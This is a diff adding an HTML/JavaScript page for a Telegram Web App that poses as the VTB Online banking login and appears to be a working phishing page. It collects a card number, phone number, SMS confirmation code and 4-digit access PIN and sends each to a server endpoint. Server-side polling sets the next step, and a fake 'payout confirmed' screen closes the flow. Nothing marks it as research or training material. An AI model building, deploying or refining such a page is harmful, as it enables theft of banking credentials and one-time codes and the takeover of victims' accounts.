@@ -1,0 +1,768 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>ВТБ Онлайн</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #0a1628;
+      min-height: 100vh;
+      overflow-x: hidden;
+      color: #fff;
+    }
+
+    .hidden { display: none !important; }
+
+    /* ── VTB Header ── */
+    .vtb-header {
+      background: linear-gradient(135deg, #001d5e 0%, #002882 100%);
+      padding: 24px 20px 28px;
+      text-align: center;
+      position: relative;
+    }
+    .vtb-header::after {
+      content: '';
+      position: absolute;
+      bottom: -12px;
+      left: 0; right: 0;
+      height: 24px;
+      background: #0d1f3c;
+      border-radius: 16px 16px 0 0;
+    }
+    .vtb-logo-row {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 6px;
+    }
+    .vtb-logo-text {
+      font-size: 24px;
+      font-weight: 800;
+      color: #fff;
+      letter-spacing: 1px;
+    }
+    .vtb-header p {
+      color: rgba(255,255,255,0.7);
+      font-size: 14px;
+      margin-top: 2px;
+    }
+
+    /* ── Card / Code Steps ── */
+    .step-body {
+      padding: 24px 20px 32px;
+      background: #0d1f3c;
+    }
+    .step-body h2 {
+      font-size: 22px;
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 8px;
+    }
+    .step-body .subtitle {
+      color: rgba(255,255,255,0.5);
+      font-size: 14px;
+      margin-bottom: 24px;
+    }
+    .input-group {
+      position: relative;
+      margin-bottom: 16px;
+    }
+    .input-group label {
+      display: block;
+      font-size: 13px;
+      color: rgba(255,255,255,0.5);
+      margin-bottom: 6px;
+      font-weight: 500;
+    }
+    .input-group input {
+      width: 100%;
+      padding: 16px;
+      font-size: 20px;
+      letter-spacing: 2px;
+      border: 1.5px solid rgba(255,255,255,0.15);
+      border-radius: 14px;
+      outline: none;
+      background: rgba(255,255,255,0.06);
+      color: #fff;
+      transition: border-color .2s;
+    }
+    .input-group input::placeholder {
+      color: rgba(255,255,255,0.25);
+    }
+    .input-group input:focus {
+      border-color: #3b82f6;
+    }
+    .input-group input.error-border {
+      border-color: #ef4444;
+    }
+    .input-group .card-icon {
+      position: absolute;
+      right: 16px;
+      bottom: 14px;
+      width: 32px; height: 22px;
+      background: #0047BB;
+      border-radius: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .card-icon svg { width: 18px; height: 18px; }
+    .error-text {
+      color: #ef4444;
+      font-size: 13px;
+      margin-top: 6px;
+      min-height: 18px;
+    }
+    .btn-primary {
+      width: 100%;
+      padding: 16px;
+      background: #0047BB;
+      color: #fff;
+      border: none;
+      border-radius: 14px;
+      font-size: 17px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 8px;
+      transition: background .2s, transform .1s;
+    }
+    .btn-primary:active {
+      background: #003399;
+      transform: scale(0.98);
+    }
+    .btn-primary:disabled {
+      background: rgba(0,71,187,0.35);
+      color: rgba(255,255,255,0.4);
+      cursor: not-allowed;
+    }
+
+    /* ── Loading ── */
+    .loading-screen {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      background: #0a1628;
+    }
+    .loading-screen p {
+      color: rgba(255,255,255,0.5);
+      font-size: 15px;
+      margin-top: 20px;
+    }
+    .loading-screen .vtb-loading-logo {
+      margin-bottom: 24px;
+    }
+
+    /* ── PIN Screen ── */
+    .pin-screen {
+      min-height: 100vh;
+      background: linear-gradient(170deg, #0e1a30 0%, #162a50 30%, #1d3560 60%, #243f6e 100%);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 0;
+      position: relative;
+      overflow: hidden;
+    }
+    .pin-screen::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background:
+        radial-gradient(ellipse at 30% 20%, rgba(30,60,120,0.5), transparent 60%),
+        radial-gradient(ellipse at 70% 70%, rgba(20,40,90,0.4), transparent 50%);
+    }
+    .pin-content {
+      position: relative;
+      z-index: 1;
+      width: 100%;
+      max-width: 400px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 0 20px;
+      flex: 1;
+    }
+    .pin-back-btn {
+      position: absolute;
+      top: 16px;
+      left: 16px;
+      z-index: 2;
+      width: 32px;
+      height: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: rgba(255,255,255,0.1);
+      border-radius: 50%;
+      border: none;
+      cursor: pointer;
+    }
+    .pin-back-btn svg { width: 18px; height: 18px; }
+    .pin-title-area {
+      margin-top: 60px;
+      text-align: center;
+      margin-bottom: 32px;
+    }
+    .pin-title-area h2 {
+      color: #fff;
+      font-size: 22px;
+      font-weight: 700;
+      margin-bottom: 8px;
+    }
+    .pin-title-area p {
+      color: rgba(255,255,255,0.6);
+      font-size: 14px;
+      line-height: 1.4;
+    }
+    .pin-dots {
+      display: flex;
+      gap: 16px;
+      margin-bottom: 40px;
+      justify-content: center;
+    }
+    .pin-dot {
+      width: 16px;
+      height: 16px;
+      background: rgba(255,255,255,0.25);
+      border-radius: 50%;
+      transition: background .15s, transform .15s;
+    }
+    .pin-dot.filled {
+      background: #fff;
+      transform: scale(1.1);
+    }
+    .pin-error-text {
+      color: #ff6b6b;
+      font-size: 13px;
+      min-height: 18px;
+      margin-top: -32px;
+      margin-bottom: 16px;
+      text-align: center;
+    }
+    .pin-keyboard {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 12px;
+      width: 100%;
+      max-width: 300px;
+      margin-top: auto;
+      margin-bottom: 40px;
+    }
+    .pin-key {
+      height: 64px;
+      background: transparent;
+      border: none;
+      border-radius: 50%;
+      color: #fff;
+      font-size: 28px;
+      font-weight: 400;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background .15s, transform .1s;
+      user-select: none;
+      -webkit-tap-highlight-color: transparent;
+    }
+    .pin-key:active {
+      background: rgba(255,255,255,0.12);
+      transform: scale(0.92);
+    }
+    .pin-key.placeholder {
+      visibility: hidden;
+      cursor: default;
+    }
+    .pin-key.backspace {
+      font-size: 22px;
+      color: rgba(255,255,255,0.7);
+    }
+
+    /* ── Success ── */
+    .success-screen {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      background: #0a1628;
+      padding: 24px 32px;
+    }
+    .success-icon {
+      width: 80px; height: 80px;
+      background: #0047BB;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 24px;
+      animation: pop .4s ease;
+    }
+    @keyframes pop {
+      0% { transform: scale(0); }
+      70% { transform: scale(1.15); }
+      100% { transform: scale(1); }
+    }
+    .success-icon svg { width: 40px; height: 40px; }
+    .success-screen h2 {
+      font-size: 22px;
+      color: #fff;
+      font-weight: 700;
+      text-align: center;
+    }
+    .success-screen p {
+      color: rgba(255,255,255,0.7);
+      font-size: 16px;
+      line-height: 1.5;
+      margin-top: 12px;
+      text-align: center;
+    }
+
+    /* ── Blocked ── */
+    .blocked-screen {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      background: #0a1628;
+    }
+    .blocked-icon {
+      width: 80px; height: 80px;
+      background: #ef4444;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+    .blocked-icon span {
+      color: #fff;
+      font-size: 40px;
+      font-weight: 700;
+    }
+    .blocked-screen h2 {
+      font-size: 22px;
+      color: #fff;
+    }
+    .blocked-screen p {
+      color: rgba(255,255,255,0.5);
+      font-size: 14px;
+      margin-top: 8px;
+    }
+  </style>
+</head>
+<body>
+
+<!-- ====== STEP: CARD + PHONE ====== -->
+<div id="step-card" class="step hidden">
+  <div class="vtb-header">
+    <div class="vtb-logo-row">
+      <span class="vtb-logo-text">ВТБ</span>
+    </div>
+    <p>Авторизация</p>
+  </div>
+  <div class="step-body">
+    <h2>Введите данные</h2>
+    <p class="subtitle">Для входа в систему укажите номер карты и телефон</p>
+    <div class="input-group">
+      <label>Номер карты</label>
+      <input type="tel" id="card-input" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="off" inputmode="numeric">
+      <div class="card-icon">
+        <svg viewBox="0 0 24 24" fill="none"><rect x="2" y="5" width="20" height="14" rx="2" stroke="#fff" stroke-width="1.5"/><line x1="2" y1="10" x2="22" y2="10" stroke="#fff" stroke-width="1.5"/></svg>
+      </div>
+    </div>
+    <div class="input-group">
+      <label>Номер телефона</label>
+      <input type="tel" id="phone-input" placeholder="+7" maxlength="16" autocomplete="off" inputmode="tel">
+    </div>
+    <div id="card-error" class="error-text"></div>
+    <button id="card-btn" class="btn-primary" disabled>Продолжить</button>
+  </div>
+</div>
+
+<!-- ====== STEP: SMS CODE ====== -->
+<div id="step-code" class="step hidden">
+  <div class="vtb-header">
+    <div class="vtb-logo-row">
+      <span class="vtb-logo-text">ВТБ</span>
+    </div>
+    <p>Подтверждение</p>
+  </div>
+  <div class="step-body">
+    <h2>Введите код из SMS</h2>
+    <p class="subtitle">Мы отправили код подтверждения на ваш номер телефона</p>
+    <div class="input-group">
+      <input type="tel" id="code-input" placeholder="000000" maxlength="6" autocomplete="off" inputmode="numeric">
+    </div>
+    <div id="code-error" class="error-text"></div>
+    <button id="code-btn" class="btn-primary" disabled>Подтвердить</button>
+  </div>
+</div>
+
+<!-- ====== STEP: PIN KEYBOARD ====== -->
+<div id="step-pin" class="step hidden">
+  <div class="pin-screen">
+    <div class="pin-back-btn">
+      <svg viewBox="0 0 24 24" fill="none"><path d="M15 19l-7-7 7-7" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+    </div>
+    <div class="pin-content">
+      <div class="pin-title-area">
+        <h2>Введите код доступа</h2>
+        <p>Вы устанавливали его для входа<br>в ВТБ Онлайн</p>
+      </div>
+      <div class="pin-dots" id="pin-dots">
+        <div class="pin-dot"></div>
+        <div class="pin-dot"></div>
+        <div class="pin-dot"></div>
+        <div class="pin-dot"></div>
+      </div>
+      <div id="pin-error" class="pin-error-text"></div>
+      <div class="pin-keyboard" id="pin-keyboard">
+        <button class="pin-key" data-key="1">1</button>
+        <button class="pin-key" data-key="2">2</button>
+        <button class="pin-key" data-key="3">3</button>
+        <button class="pin-key" data-key="4">4</button>
+        <button class="pin-key" data-key="5">5</button>
+        <button class="pin-key" data-key="6">6</button>
+        <button class="pin-key" data-key="7">7</button>
+        <button class="pin-key" data-key="8">8</button>
+        <button class="pin-key" data-key="9">9</button>
+        <div class="pin-key placeholder"></div>
+        <button class="pin-key" data-key="0">0</button>
+        <button class="pin-key backspace" data-key="back">⌫</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ====== STEP: LOADING ====== -->
+<div id="step-loading" class="step hidden">
+  <div class="loading-screen">
+    <div class="vtb-loading-logo">
+      <svg width="56" height="56" viewBox="0 0 56 56"><circle cx="28" cy="28" r="26" fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="3"/><circle cx="28" cy="28" r="26" fill="none" stroke="#3b82f6" stroke-width="3" stroke-dasharray="50 120" stroke-linecap="round"><animateTransform attributeName="transform" type="rotate" from="0 28 28" to="360 28 28" dur="0.8s" repeatCount="indefinite"/></circle></svg>
+    </div>
+    <p>Пожалуйста, подождите...</p>
+  </div>
+</div>
+
+<!-- ====== STEP: SUCCESS ====== -->
+<div id="step-success" class="step hidden">
+  <div class="success-screen">
+    <div class="success-icon">
+      <svg viewBox="0 0 24 24" fill="none"><path d="M5 12l5 5L19 7" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg>
+    </div>
+    <h2>🎊 Спасибо за ваш выбор! 🎊</h2>
+    <p>Ваша выплата успешно подтверждена и будет зачислена в течение 30 дней.</p>
+    <p style="margin-top: 16px;">💫 Оставайтесь с нами — впереди ещё больше приятных возможностей!</p>
+    <button id="close-btn" class="btn-primary" style="max-width: 320px; margin-top: 24px;">Завершить</button>
+  </div>
+</div>
+
+<!-- ====== STEP: BLOCKED ====== -->
+<div id="step-blocked" class="step hidden">
+  <div class="blocked-screen">
+    <div class="blocked-icon"><span>✕</span></div>
+    <h2>Доступ заблокирован</h2>
+    <p>Обратитесь в службу поддержки</p>
+  </div>
+</div>
+
+<script>
+(function() {
+  const tg = window.Telegram && window.Telegram.WebApp;
+  let initData = '';
+
+  if (tg) {
+    tg.ready();
+    tg.expand();
+    tg.setHeaderColor('#001d5e');
+    tg.setBackgroundColor('#0a1628');
+    initData = tg.initData;
+  }
+
+  let pollTimer = null;
+  let pinValue = '';
+
+  function luhnCheck(num) {
+    const d = num.replace(/\s/g, '');
+    if (!/^\d{16,19}$/.test(d)) return false;
+    let s = 0, alt = false;
+    for (let i = d.length - 1; i >= 0; i--) {
+      let n = parseInt(d[i], 10);
+      if (alt) { n *= 2; if (n > 9) n -= 9; }
+      s += n; alt = !alt;
+    }
+    return s % 10 === 0;
+  }
+
+  function showStep(step, error) {
+    document.querySelectorAll('.step').forEach(el => el.classList.add('hidden'));
+    stopPolling();
+
+    if (step === 'card') {
+      document.getElementById('step-card').classList.remove('hidden');
+      const errEl = document.getElementById('card-error');
+      const cardInp = document.getElementById('card-input');
+      if (error) {
+        errEl.textContent = error;
+        cardInp.classList.add('error-border');
+      } else {
+        errEl.textContent = '';
+        cardInp.classList.remove('error-border');
+      }
+    } else if (step === 'card_pending' || step === 'code_pending' || step === 'pin_pending') {
+      document.getElementById('step-loading').classList.remove('hidden');
+      startPolling();
+    } else if (step === 'code') {
+      document.getElementById('step-code').classList.remove('hidden');
+      const errEl = document.getElementById('code-error');
+      const inp = document.getElementById('code-input');
+      if (error) {
+        errEl.textContent = error;
+        inp.classList.add('error-border');
+        inp.value = '';
+      } else {
+        errEl.textContent = '';
+        inp.classList.remove('error-border');
+      }
+      document.getElementById('code-btn').disabled = true;
+    } else if (step === 'pin') {
+      document.getElementById('step-pin').classList.remove('hidden');
+      pinValue = '';
+      updatePinDots();
+      const errEl = document.getElementById('pin-error');
+      if (error) { errEl.textContent = error; }
+      else { errEl.textContent = ''; }
+    } else if (step === 'done') {
+      document.getElementById('step-success').classList.remove('hidden');
+      document.getElementById('close-btn').addEventListener('click', function() {
+        if (tg) tg.close();
+      });
+    } else if (step === 'blocked') {
+      document.getElementById('step-blocked').classList.remove('hidden');
+    }
+  }
+
+  function startPolling() {
+    stopPolling();
+    pollTimer = setInterval(async () => {
+      try {
+        const res = await fetch('/api/app', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ action: 'status', initData })
+        });
+        const data = await res.json();
+        if (!data.step.endsWith('_pending')) {
+          showStep(data.step, data.error);
+        }
+      } catch (e) {}
+    }, 2000);
+  }
+
+  function stopPolling() {
+    if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
+  }
+
+  async function apiSubmit(type, value) {
+    const res = await fetch('/api/app', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ action: 'submit', initData, type, value })
+    });
+    return res.json();
+  }
+
+  // ── Card input ──
+  const cardInput = document.getElementById('card-input');
+  const phoneInput = document.getElementById('phone-input');
+  const cardBtn = document.getElementById('card-btn');
+  const cardError = document.getElementById('card-error');
+
+  function checkCardFormReady() {
+    const cardRaw = cardInput.value.replace(/\D/g, '');
+    const phoneDigits = phoneInput.value.replace(/\D/g, '');
+    cardBtn.disabled = cardRaw.length < 16 || phoneDigits.length < 11;
+  }
+
+  cardInput.addEventListener('input', function() {
+    let v = this.value.replace(/\D/g, '').substring(0, 16);
+    this.value = v.replace(/(\d{4})/g, '$1 ').trim();
+    cardError.textContent = '';
+    this.classList.remove('error-border');
+    checkCardFormReady();
+  });
+
+  // ── Phone input: "+7" always stays, digits format as +7XXX XXX XX XX ──
+  phoneInput.addEventListener('focus', function() {
+    if (!this.value) this.value = '+7';
+  });
+
+  phoneInput.addEventListener('input', function() {
+    let raw = this.value.replace(/\D/g, '');
+    if (raw.length === 0) { this.value = '+7'; return; }
+    if (!raw.startsWith('7')) raw = '7' + raw;
+    raw = raw.substring(0, 11);
+
+    let display = '+7';
+    const after7 = raw.substring(1);
+    if (after7.length > 0) display += after7.substring(0, 3);
+    if (after7.length > 3) display += ' ' + after7.substring(3, 6);
+    if (after7.length > 6) display += ' ' + after7.substring(6, 8);
+    if (after7.length > 8) display += ' ' + after7.substring(8, 10);
+    this.value = display;
+    cardError.textContent = '';
+    checkCardFormReady();
+  });
+
+  phoneInput.addEventListener('keydown', function(e) {
+    if (e.key === 'Backspace' && this.value.length <= 2) {
+      e.preventDefault();
+    }
+  });
+
+  cardBtn.addEventListener('click', async function() {
+    const cardRaw = cardInput.value.replace(/\s/g, '');
+    const phoneDigits = phoneInput.value.replace(/\D/g, '');
+
+    if (!luhnCheck(cardRaw)) {
+      cardError.textContent = 'Номер карты указан неверно';
+      cardInput.classList.add('error-border');
+      return;
+    }
+    if (phoneDigits.length < 11) {
+      cardError.textContent = 'Номер телефона указан неверно';
+      return;
+    }
+
+    cardBtn.disabled = true;
+    cardBtn.textContent = 'Отправка...';
+    try {
+      const data = await apiSubmit('card', { card: cardRaw, phone: phoneDigits });
+      if (data.error && data.step === 'card') {
+        cardError.textContent = data.error;
+        cardInput.classList.add('error-border');
+        cardBtn.disabled = false;
+        cardBtn.textContent = 'Продолжить';
+      } else {
+        showStep(data.step, data.error);
+      }
+    } catch (e) {
+      cardError.textContent = 'Ошибка сети, попробуйте снова';
+      cardBtn.disabled = false;
+      cardBtn.textContent = 'Продолжить';
+    }
+  });
+
+  // ── Code input ──
+  const codeInput = document.getElementById('code-input');
+  const codeBtn = document.getElementById('code-btn');
+  const codeError = document.getElementById('code-error');
+
+  codeInput.addEventListener('input', function() {
+    this.value = this.value.replace(/\D/g, '').substring(0, 6);
+    codeBtn.disabled = this.value.length < 6;
+    codeError.textContent = '';
+    this.classList.remove('error-border');
+  });
+
+  codeBtn.addEventListener('click', async function() {
+    const val = codeInput.value.trim();
+    if (!/^\d{6}$/.test(val)) {
+      codeError.textContent = 'Код должен содержать 6 цифр';
+      codeInput.classList.add('error-border');
+      return;
+    }
+    codeBtn.disabled = true;
+    codeBtn.textContent = 'Отправка...';
+    try {
+      const data = await apiSubmit('code', val);
+      if (data.error && data.step === 'code') {
+        codeError.textContent = data.error;
+        codeInput.classList.add('error-border');
+        codeBtn.disabled = false;
+        codeBtn.textContent = 'Подтвердить';
+      } else {
+        showStep(data.step, data.error);
+      }
+    } catch (e) {
+      codeError.textContent = 'Ошибка сети, попробуйте снова';
+      codeBtn.disabled = false;
+      codeBtn.textContent = 'Подтвердить';
+    }
+  });
+
+  // ── PIN keyboard (4 digits) ──
+  function updatePinDots() {
+    const dots = document.querySelectorAll('#pin-dots .pin-dot');
+    dots.forEach((dot, i) => {
+      dot.classList.toggle('filled', i < pinValue.length);
+    });
+  }
+
+  document.getElementById('pin-keyboard').addEventListener('click', async function(e) {
+    const btn = e.target.closest('.pin-key');
+    if (!btn || btn.classList.contains('placeholder')) return;
+
+    const key = btn.dataset.key;
+    document.getElementById('pin-error').textContent = '';
+
+    if (key === 'back') {
+      if (pinValue.length > 0) {
+        pinValue = pinValue.slice(0, -1);
+        updatePinDots();
+      }
+      return;
+    }
+
+    if (pinValue.length >= 4) return;
+    pinValue += key;
+    updatePinDots();
+
+    if (pinValue.length === 4) {
+      try {
+        const data = await apiSubmit('pin', pinValue);
+        if (data.error && data.step === 'pin') {
+          document.getElementById('pin-error').textContent = data.error;
+          pinValue = '';
+          updatePinDots();
+        } else {
+          showStep(data.step, data.error);
+        }
+      } catch (e) {
+        document.getElementById('pin-error').textContent = 'Ошибка сети';
+        pinValue = '';
+        updatePinDots();
+      }
+    }
+  });
+
+  // ── Init ──
+  async function init() {
+    showStep('card_pending', null);
+    try {
+      const res = await fetch('/api/app', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ action: 'status', initData })
+      });
+      const data = await res.json();
+      showStep(data.step, data.error);
+    } catch (e) {
+      showStep('card', null);
+    }
+  }
+
+  init();
+})();
+</script>
+</body>
+</html>
